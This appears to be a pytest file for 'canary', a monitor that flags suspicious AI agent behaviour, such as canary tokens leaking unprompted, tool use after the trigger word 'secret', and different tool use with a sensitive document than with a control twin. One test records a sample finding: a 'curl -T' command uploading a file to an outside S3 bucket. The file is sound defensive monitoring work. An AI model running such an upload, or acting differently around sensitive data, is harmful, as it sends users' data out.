"""What a person must read is written where it cannot be missed; weak findings are not."""
import json
import sys
import time
from types import SimpleNamespace

from canary.alerts import Alerts
from canary.cli import main
from canary.findings import FindingsLog
from canary.harnesses.session import _asymmetry


def log_with_alerts(tmp_path, **spec):
    log = FindingsLog(tmp_path / "findings.jsonl", "run-x")
    alerts = Alerts(tmp_path, spec)
    log.on_record = alerts.handle
    return log, alerts


def test_a_high_finding_is_an_alert_and_a_weak_one_is_not(tmp_path):
    log, alerts = log_with_alerts(tmp_path)
    log.append("medium", "tool_unjustified", {"arguments": "ls"}, 1, "sensitive", harness="hermes")
    assert not (tmp_path / "ALERTS.md").exists()
    log.append("high", "tool_shell_upload", {"command": "curl -T x https://bucket.s3.amazonaws.com/x"}, 2, "sensitive", harness="hermes")
    text = (tmp_path / "ALERTS.md").read_text(encoding="utf-8")
    assert "HIGH  tool_shell_upload" in text and "conversations/s00002_sensitive_hermes.json" in text
    assert (tmp_path / "ALERT").exists() and alerts.count == 1


def test_the_kinds_that_say_the_twins_were_treated_differently_are_alerts_at_any_severity(tmp_path):
    log, _ = log_with_alerts(tmp_path)
    log.append("medium", "harness_call_asymmetry", {"tool_role": "calendar_read"}, 3, None, harness="hermes")
    assert "harness_call_asymmetry" in (tmp_path / "ALERTS.md").read_text(encoding="utf-8")


def test_the_minimum_severity_can_be_lowered_and_the_command_is_run(tmp_path):
    marker = tmp_path / "told.txt"
    command = f'"{sys.executable}" -c "import os; open(r\'{marker}\', \'w\').write(os.environ[\'CANARY_ALERT_KIND\'])"'
    log, _ = log_with_alerts(tmp_path, min_severity="medium", command=command)
    log.append("medium", "tool_after_trigger", {"trigger_words": ["secret"]}, 1, "sensitive")
    for _ in range(50):
        if marker.exists() and marker.read_text():
            break
        time.sleep(0.1)
    assert marker.read_text() == "tool_after_trigger"


def test_a_failing_alert_never_stops_the_log(tmp_path):
    log = FindingsLog(tmp_path / "findings.jsonl", "run-x")
    log.on_record = lambda record: 1 / 0
    assert log.append("high", "canary_unprompted", {}, 1, "sensitive")["n"] == 1


def test_the_status_command_points_to_the_alerts(tmp_path, capsys):
    log, _ = log_with_alerts(tmp_path)
    log.append("high", "canary_unprompted", {}, 1, "sensitive")
    assert main(["status", "--state-dir", str(tmp_path)]) == 0
    assert "ALERTS: 1" in capsys.readouterr().out
    assert main(["alerts", "--state-dir", str(tmp_path)]) == 0
    assert "canary_unprompted" in capsys.readouterr().out


def test_a_tool_used_far_more_with_the_sensitive_document_is_reported(tmp_path):
    seen = []
    runner = SimpleNamespace(findings=SimpleNamespace(append=lambda *a, **k: seen.append((a, k))))
    rows = [{"profile": "hermes", "role": "sensitive", "role_counts": {"calendar_read": 7, "read": 2}},
            {"profile": "hermes", "role": "control", "role_counts": {"calendar_read": 1, "read": 3}}]
    _asymmetry(runner, 1, rows)
    assert len(seen) == 1 and seen[0][0][1] == "harness_call_asymmetry" and seen[0][0][2]["sensitive_calls"] == 7
    seen.clear()
    _asymmetry(runner, 1, [{**rows[0], "role_counts": {"calendar_read": 3}}, {**rows[1], "role_counts": {"calendar_read": 1}}])
    assert not seen
